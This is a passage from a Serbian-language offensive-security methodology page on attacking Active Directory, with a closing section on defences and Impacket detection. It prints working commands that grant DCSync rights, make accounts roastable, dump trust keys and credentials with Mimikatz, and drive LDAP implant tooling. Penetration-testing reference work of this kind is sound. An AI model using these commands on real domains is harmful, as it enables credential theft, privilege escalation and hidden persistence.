Ako korisnik ima privilegije za **access MSSQL instances**, mogao bi da ih iskoristi za **execute commands** na MSSQL hostu (ako radi kao SA), da **steal**-uje NetNTLM **hash** ili čak izvrši **relay** **attack**.\
Takođe, ako je MSSQL instanca trusted (database link) od strane druge MSSQL instance, a korisnik ima privilegije nad trusted bazom, moći će da **use the trust relationship to execute queries also in the other instance**. Ovi trust-ovi mogu da se ulančavaju i korisnik bi u nekom trenutku mogao da pronađe pogrešno konfigurisanu bazu podataka na kojoj može da izvrši komande.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse IT asset/deployment platforms

Third-party inventory i deployment suites često otkrivaju moćne puteve do credentials i code execution. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na tom računaru, moći ćete da dump-ujete TGT-ove iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin** prijavi na računar, moći ćete da dump-ujete njegov TGT i da se impersonate-ujete pomoću [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, mogli biste čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", on će moći da se **impersonate-uje kao bilo koji korisnik radi access-a određenim servisima na računaru**.\
Zatim, ako **compromise**-ujete **hash** ovog korisnika/računara, moći ćete da se **impersonate-ujete kao bilo koji korisnik** (čak i kao domain admins) radi access-a određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posedovanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava sticanje code execution-a sa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse Permissions/ACLs

Kompromitovani korisnik može imati neke **interesantne privilegije nad određenim domain objektima** koje bi vam mogle omogućiti lateralno **move**-ovanje/**escalate** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domain-a može se **abuse**-ovati za **acquire novih credentials** i **escalate privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse third-party sesija

Ako **other users** **access**-uju **compromised** računar, moguće je **gather credentials from memory** i čak **inject beacons u njihove procese** kako bi se izvršio impersonation.\
Korisnici obično pristupaju sistemu putem RDP-a, pa ovde možete videti kako da izvršite nekoliko attack-a nad third-party RDP sesijama:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnom Administrator lozinkom** na računarima pridruženim domain-u, čime se obezbeđuje da ona bude **randomized**, jedinstvena i često **changed**. Ove lozinke se čuvaju u Active Directory-ju, a access se kontroliše putem ACL-ova, tako da pristup imaju samo authorized korisnici. Uz dovoljne permission-e za access ovim lozinkama, moguće je pivot-ovanje na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** sa kompromitovanog računara može biti način za escalate privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse Certificate Templates

Ako su konfigurisani **vulnerable templates**, moguće je abuse-ovati ih za escalate privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa high privilege account-om

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin** ili, još bolje, **Enterprise Admin**, možete da **dump**-ujete **domain bazu podataka**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao Persistence

Neke od prethodno opisanih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitimate Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ovaj metod se koristi za **access service privilegijama**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da attacker dobije pristup **NTLM hash-u krbtgt account-a** u Active Directory (AD) okruženju. Ovaj account je poseban zato što se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su neophodni za authentication unutar AD network-a.

Kada attacker dobije ovaj hash, može da kreira **TGTs** za bilo koji account koji izabere (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su slični golden ticket-ima, ali su forged na način koji **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** predstavlja veoma dobar način za persistence u korisničkom account-u (čak i ako korisnik promeni password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

**AdminSDHolder** objekat u Active Directory-ju obezbeđuje sigurnost **privileged groups** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na ove grupe, kako bi se sprečile unauthorized izmene. Međutim, ova funkcija može biti exploited; ako attacker izmeni ACL AdminSDHolder-a tako da običnom korisniku dodeli full access, taj korisnik dobija široku kontrolu nad svim privileged groups. Ova security mera, namenjena zaštiti, tako može imati suprotan efekat i omogućiti neovlašćeni access ako se pažljivo ne nadgleda.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller (DC)**-a postoji **local administrator** account. Dobijanjem admin prava na takvom računaru, local Administrator hash može se extract-ovati pomoću **mimikatz**-a. Nakon toga je potrebna izmena registry-ja kako bi se **enable-ovala upotreba ove lozinke**, čime se omogućava remote access lokalnom Administrator account-u.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** određene **special permissions** nekom **user-u** nad konkretnim domain objektima, što će korisniku omogućiti da u budućnosti **escalate-uje privileges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permissions** koje **object** ima **nad** drugim **object-om**. Ako možete samo da napravite **malu izmenu** u **security descriptor-u** objekta, možete dobiti veoma interesantne privilegije nad tim objektom, bez potrebe da budete član privileged grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse-ujte `dynamicObject` auxiliary class za kreiranje kratkotrajnih principal-a/GPO-ova/DNS zapisa sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstone-ova, uklanjajući LDAP dokaze, dok ostavljaju orphan SID-ove, pokvarene `gPLink` reference ili keširane DNS odgovore (npr. AdminSDHolder ACE pollution ili maliciozne `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji kako biste uspostavili **universal password**, čime se omogućava access svim domain account-ima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** za **capture** credentials korišćenih za access računaru u **clear text** formatu.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

On registruje **novi Domain Controller** u AD-ju i koristi ga za **push attributes** (SIDHistory, SPNs...) na navedene objekte, bez ostavljanja bilo kakvih **log-ova** o tim **modifications**. Potrebne su vam **DA** privilegije i morate biti unutar **root domain-a**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti veoma ružni log-ovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Prethodno smo opisali kako da escalate-ujete privilegije ako imate **dovoljno permission-a za čitanje LAPS lozinki**. Međutim, ove lozinke se mogu koristiti i za **maintain persistence**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft posmatra **Forest** kao security boundary. To znači da bi **compromise** jednog domain-a potencijalno mogao dovesti do compromise-a čitavog **Forest-a**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je security mehanizam koji korisniku iz jednog **domain-a** omogućava pristup resursima u drugom **domain-u**. On u suštini kreira vezu između authentication sistema dva domain-a, omogućavajući nesmetan protok authentication provera. Kada domain-i uspostave trust, oni razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controller-a (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da access-uje servis u **trusted domain-u**, prvo mora da zatraži poseban ticket, poznat kao **inter-realm TGT**, od DC-a svog domain-a. Ovaj TGT je encrypted shared **key-em** oko kog su se oba domain-a usaglasila. Korisnik zatim prosleđuje ovaj TGT **DC-u trusted domain-a** kako bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domain-a, on izdaje TGS, čime korisniku omogućava access servisu.

**Koraci**:

1. **Client computer** u **Domain 1** započinje proces koristeći svoj **NTLM hash** za zahtev **Ticket Granting Ticket (TGT)**-a od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je client uspešno authenticated.
3. Client zatim zahteva **inter-realm TGT** od DC1, koji je potreban za access resursima u **Domain 2**.
4. Inter-realm TGT je encrypted **trust key-em** koji DC1 i DC2 dele kao deo two-way domain trust-a.
5. Client prosleđuje inter-realm TGT **Domain 2 Domain Controller-u (DC2)**.
6. DC2 proverava inter-realm TGT koristeći shared trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome client želi da pristupi.
7. Na kraju, client prosleđuje ovaj TGS serveru, koji je encrypted hash-om server account-a, kako bi dobio access servisu u Domain 2.

### Different trusts

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji, oba domain-a veruju jedan drugom, ali u **jednosmernoj** trust relaciji jedan domain će biti **trusted**, a drugi **trusting** domain. U poslednjem slučaju, **moći ćete da access-ujete resurse unutar trusting domain-a samo iz trusted domain-a**.

Ako Domain A veruje Domain B-u, A je trusting domain, a B je trusted domain. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Ovo je uobičajena postavka unutar istog forest-a, gde child domain automatski ima two-way transitive trust sa svojim parent domain-om. To u suštini znači da authentication zahtevi mogu nesmetano da prolaze između parent-a i child-a.
- **Cross-link Trusts**: Poznati i kao "shortcut trusts", uspostavljaju se između child domain-a radi ubrzavanja referral procesa. U složenim forest-ovima, authentication referrals obično moraju da putuju do forest root-a, a zatim nazad do target domain-a. Kreiranjem cross-link-ova put se skraćuje, što je naročito korisno u geografski distribuiranim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domain-a i po prirodi su non-transitive. Prema [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za access resursima u domain-u izvan trenutnog forest-a koji nije povezan forest trust-om. Security se pojačava SID filtering-om kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domain-a i novog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni za dodavanje novih domain stabala u forest, omogućavajući im da zadrže jedinstveno domain ime i obezbeđujući two-way transitivity. Više informacija možete pronaći u [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je two-way transitive trust između dva forest root domain-a i takođe primenjuje SID filtering radi poboljšanja security mera.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain-ima. MIT trust-ovi su nešto specijalizovaniji i namenjeni su okruženjima koja zahtevaju integraciju sa Kerberos-based sistemima izvan Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relationship takođe može biti **transitive** (A trust B, B trust C, zatim A trust C) ili **non-transitive**.
- Trust relationship može biti podešen kao **bidirectional trust** (oba veruju jedan drugom) ili kao **one-way trust** (samo jedan veruje drugom).

### Attack Path

1. **Enumerate** trusting relationship-e
2. Proverite da li neki **security principal** (user/group/computer) ima **access** resursima **drugog domain-a**, možda putem ACE entry-ja ili članstvom u grupama drugog domain-a. Potražite **relationships across domains** (trust je verovatno zbog toga kreiran).
1. Kerberoast u ovom slučaju može biti druga opcija.
3. **Compromise**-ujte **account-e** koji mogu da **pivot**-uju kroz domain-e.

Attackers sa access-om resursima u drugom domain-u mogu do njih doći putem tri primarna mehanizma:

- **Local Group Membership**: Principals mogu biti dodati u lokalne grupe na računarima, kao što je “Administrators” grupa na serveru, čime dobijaju značajnu kontrolu nad tim računarom.
- **Foreign Domain Group Membership**: Principals takođe mogu biti članovi grupa unutar foreign domain-a. Međutim, efektivnost ove metode zavisi od prirode trust-a i scope-a grupe.
- **Access Control Lists (ACLs)**: Principals mogu biti navedeni u **ACL**-u, naročito kao entiteti u **ACE**-ovima unutar **DACL**-a, čime im se omogućava pristup određenim resursima. Za one koji žele detaljnije da prouče mehanizme ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” predstavlja neprocenjiv resurs.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domain-u. To će biti user/group iz **external domain/forest-a**.

Ovo možete proveriti u **Bloodhound**-u ili pomoću powerview-a:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju trustova domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Onaj koji koristi trenutni domen možete dobiti pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte na Enterprise admin nivo u child/parent domenu zloupotrebom trust-a putem SID-History injection-a:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji Configuration Naming Context (NC) može biti iskorišćen je od ključnog značaja. Configuration NC služi kao centralno skladište konfiguracionih podataka u čitavoj šumi u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar šume, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC-a. Da bi se ovo iskoristilo, neophodne su **SYSTEM privilegije na DC-u**, po mogućnosti na child DC-u.

**Link GPO to root DC site**

Sites kontejner u Configuration NC-u sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD šume. Korišćenjem SYSTEM privilegija na bilo kom DC-u, napadači mogu povezati GPO-ove sa site-ovima root DC-a. Ova radnja potencijalno kompromituje root domen manipulisanjem pravilima koja se primenjuju na te site-ove.

Za detaljnije informacije možete proučiti istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

Jedan od attack vektora podrazumeva ciljanje privilegovanih gMSA naloga u domenu. KDS Root key, neophodan za izračunavanje lozinki gMSA naloga, čuva se unutar Configuration NC-a. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u čitavoj šumi.

Detaljna analiza i uputstva korak po korak dostupni su u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski delegirani MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ovaj metod zahteva strpljenje i čekanje da se kreiraju novi privilegovani AD objekti. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema kako bi bilo kom korisniku dodelio potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa novokreiranim AD objektima i kontrole nad njima.

Dodatna literatura dostupna je u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad Public Key Infrastructure (PKI) objektima radi kreiranja certificate template-a koji omogućava autentifikaciju kao bilo koji korisnik unutar šume. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvršavanje ESC5 napada.

Više detalja dostupno je u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U scenarijima bez ADCS-a, napadač može podesiti neophodne komponente, kao što je opisano u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je trusted** od strane eksternog domena, koji vam daje **neodređene dozvole** nad njim. Potrebno je da pronađete **koji principi vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerno (izlazno)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **veruje** nekim **privilegijama** principal-a iz **drugih domena**.

Međutim, kada **domenu veruje** domen koji mu ukazuje poverenje, trusted domen **kreira korisnika** sa **predvidljivim imenom**, koji kao **lozinku koristi lozinku trust-a**. To znači da je moguće **pristupiti korisniku iz trust-ujućeg domena i ući u trusted domen**, kako bi se on enumerisao i pokušalo dodatno eskaliranje privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način kompromitovanja trusted domena jeste pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** od domain trust-a (što nije naročito uobičajeno).

Drugi način kompromitovanja trusted domena jeste čekanje na mašini kojoj **korisnik iz trusted domena može pristupiti** da bi se prijavio putem **RDP-a**. Zatim bi attacker mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, attacker bi iz procesa **RDP sesije** mogao da sačuva **backdoor-e** u **startup folder-u hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigacija abuse-a domain trust-a

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko forest trust-ova ublažava se pomoću SID Filtering-a, koji je podrazumevano aktiviran na svim inter-forest trust-ovima. Ovo se zasniva na pretpostavci da su intra-forest trust-ovi bezbedni, pri čemu se forest, a ne domen, smatra security boundary-jem, u skladu sa Microsoft-ovim stavom.
- Međutim, postoji problem: SID filtering može poremetiti aplikacije i korisnički pristup, što dovodi do njegovog povremenog deaktiviranja.

### **Selective Authentication:**

- Kod inter-forest trust-ova, korišćenje Selective Authentication-a osigurava da korisnici iz ta dva forest-a ne budu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici mogli da pristupe domenima i serverima unutar trusting domena ili forest-a.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context-a (NC) niti od napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira bloodyAD-style LDAP primitives kao x64 Beacon Object Files koji se u potpunosti izvršavaju unutar on-host implant-a (npr. Adaptix C2). Operator-i kompajliraju pack pomoću `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim iz beacon-a pozivaju `ldap <subcommand>`. Sav saobraćaj koristi trenutni logon security context preko LDAP-a (389), uz signing/sealing, ili LDAPS (636), uz automatsko poverenje u certificate, tako da nisu potrebni socks proxy-ji niti disk artifacts.<sup>[[4]](#references)</sup>

### LDAP enumeration na strani implant-a

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju short names/OU paths u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptors), kao i forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a prikazuju kandidate za roasting, delegation settings i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptore.
- `get-acl` i `get-writable --detailed` analiziraju DACL kako bi izlistali trustees, prava (GenericAll/WriteDACL/WriteOwner/attribute writes) i inheritance, pružajući neposredne ciljeve za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principals ili mašinske naloge tamo gde postoje OU prava. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju kontrolu nad ciljevima kada se pronađu prava write-property.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinke, kontrolu članstva u grupama ili DCSync privilegije replikacije, bez ostavljanja PowerShell/ADSI artefakata. Odgovarajuće `remove-*` komande uklanjaju ubačene ACE-ove.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` trenutno čine kompromitovanog korisnika podložnim za Kerberoast; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez menjanja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC flags ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacon-a, omogućavajući constrained/unconstrained/RBCD attack paths i uklanjajući potrebu za remote PowerShell-om ili RSAT-om.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), obezbeđujući prikriveno nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti resurse u OU-ove u kojima delegirana prava već postoje, pre zloupotrebe komandi `set-password`, `add-groupmember` ili `add-spn`.
- Pažljivo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brzo vraćanje promena nakon što operator prikupi credentials ili persistence, uz svođenje telemetry-ja na minimum.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Saznajte više o tome kako zaštititi credentials ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, kako bi se izbeglo njihovo korišćenje na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. To se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditujte Event ID-jeve 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da detektujete uobičajeni AD tradecraft, **nemojte se oslanjati samo na artefakte pod kontrolom operatora**, kao što su preimenovani binarni fajlovi, nazivi servisa, privremeni batch fajlovi ili output paths. Napravite baseline načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **implementation quirks** koji ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (nakon validacije u odnosu na sopstveni baseline):
- Autentifikovani DCE/RPC koji koristi `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding popunjen vrednošću `0xff`
- LDAP Kerberos bind-ovi koji postavljaju raw Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
- SMB2/3 negotiate zahtevi sa ASCII-looking `ClientGuid` vrednostima
- WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
- Hardcoded Kerberos nonce vrednosti
- **Better as correlation/scoring features**:
- Sparse ili duplicirane Kerberos etype liste, neuobičajeni/nedostajući `PA-DATA` ili TGS-REQ etype redosled koji se razlikuje od nativnog Windows-a
- NTLM Type 1 poruke bez version info-a ili Type 3 poruke sa null host names
- Raw NTLMSSP prenesen u DCE/RPC umesto SPNEGO-a, nedostajući DCE/RPC verification trailers ili SPNEGO/Kerberos OID mismatches
- Više ovih karakteristika sa istog hosta/usera/session-a/time window-a mnogo je jači indikator od bilo kog pojedinačnog slabog polja
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names i tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Operatorima je lako da ih promene i najbolje ih je koristiti za objašnjenje zašto je cross-protocol cluster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju dekriptovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili service-side visibility
- Validirajte ih u odnosu na Samba/Linux klijente, appliance-e i legacy software pre nego što ih promovišete u alerts
- Promovišite detections iz enrichment -> hunting -> alerting faze kako budete sticali poverenje u baseline

### **Implementing Deception Techniques**

- Implementacija deception-a podrazumeva postavljanje zamki, poput decoy korisnika ili računara, sa karakteristikama kao što su lozinke koje ne ističu ili nalozi označeni kao Trusted for Delegation. Detaljan pristup obuhvata kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
